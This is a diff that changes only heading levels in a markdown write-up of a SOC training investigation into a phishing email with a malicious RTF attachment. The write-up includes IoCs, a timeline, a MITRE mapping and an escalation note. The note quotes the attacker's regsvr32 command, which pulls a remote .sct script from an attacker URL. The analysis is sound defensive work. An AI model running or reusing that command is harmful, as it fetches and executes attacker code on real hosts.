@@ -58,7 +58,7 @@ This case needed to investigate the alert across multiple telemetry sources:
 
 ---
 
-# Executive Findings
+## Executive Findings
 
 | # | Finding                                                                                       | Why It Matters                                                                   |
 | - | --------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
@@ -72,7 +72,7 @@ This case needed to investigate the alert across multiple telemetry sources:
 
 ---
 
-# Investigation Walkthrough
+## Investigation Walkthrough
 
 ## 1) Email Analysis
 
@@ -207,9 +207,9 @@ Any one of these alone would be concerning. Together, they form a coherent and h
 
 ---
 
-# Indicators of Compromise (IoCs)
+## Indicators of Compromise (IoCs)
 
-## Email / File IoCs
+### Email / File IoCs
 
 | Type                | Indicator                                                          |
 | ------------------- | ------------------------------------------------------------------ |
@@ -219,7 +219,7 @@ Any one of these alone would be concerning. Together, they form a coherent and h
 | **Attachment Name** | `mail.rtf`                                                         |
 | **SHA256**          | `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184` |
 
-## Network / Infrastructure IoCs
+### Network / Infrastructure IoCs
 
 | Type                  | Indicator                            |
 | --------------------- | ------------------------------------ |
@@ -227,7 +227,7 @@ Any one of these alone would be concerning. Together, they form a coherent and h
 | **Remote URL**        | `http://84.38.130.118.com/shell.sct` |
 | **Destination IP**    | `84.38.130.118`                      |
 
-## Process / Execution IoCs
+### Process / Execution IoCs
 
 | Type                       | Indicator      |
 | -------------------------- | -------------- |
@@ -238,7 +238,7 @@ Any one of these alone would be concerning. Together, they form a coherent and h
 
 ---
 
-# Timeline
+## Timeline
 
 | Time                      | Event                                                                                                      |
 | ------------------------- | ---------------------------------------------------------------------------------------------------------- |
@@ -252,7 +252,7 @@ Any one of these alone would be concerning. Together, they form a coherent and h
 
 ---
 
-# MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping
 
 | Tactic                                      | Technique                                                | ID            | Why It Fits                                                                                  |
 | ------------------------------------------- | -------------------------------------------------------- | ------------- | -------------------------------------------------------------------------------------------- |
@@ -263,13 +263,13 @@ Any one of these alone would be concerning. Together, they form a coherent and h
 
 ---
 
-# Escalation Note for Incident Response
+## Escalation Note for Incident Response
 
 **True Positive.** A malicious email was delivered to **[Austin@letsdefend.io](mailto:Austin@letsdefend.io)** from **[projectmanagement@pm.me](mailto:projectmanagement@pm.me)** with attachment **`mail.rtf`**. The attachment hash **`df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`** was flagged by **27/61 vendors** in VirusTotal, with detections referencing **malicious RTF exploitation** and **CVE-2025-21298**. Endpoint telemetry showed **`OUTLOOK.EXE`**** spawning ****`cmd.exe`**, which executed **`regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll`**, indicating LOLBin abuse to retrieve remote script content. Proxy logs confirmed a **permitted GET request** from internal host **172.16.17.137** to **`http://84.38.130.118.com/shell.sct`** at **08:06 AM**. Based on the malicious email, exploit-themed attachment detections, suspicious process chain, and confirmed outbound request to attacker-controlled infrastructure, the alert should be treated as a **confirmed malicious incident** and escalated for containment and deeper host review.
 
 ---
 
-# Lessons Learned
+## Lessons Learned
 
 This case reinforced several important SOC investigation concepts:
 
@@ -278,7 +278,3 @@ This case reinforced several important SOC investigation concepts:
 3. **LOLBin abuse matters a lot in SOC work**. Seeing legitimate binaries like `regsvr32.exe` used with remote URLs is a major red flag.
 4. **Process lineage is critical**. The fact that Outlook led into `cmd.exe` and then into `regsvr32.exe` made the case much stronger.
 5. **Proxy logs can close the loop** by confirming whether the endpoint actually reached attacker infrastructure after suspicious execution.
-
----
-
-
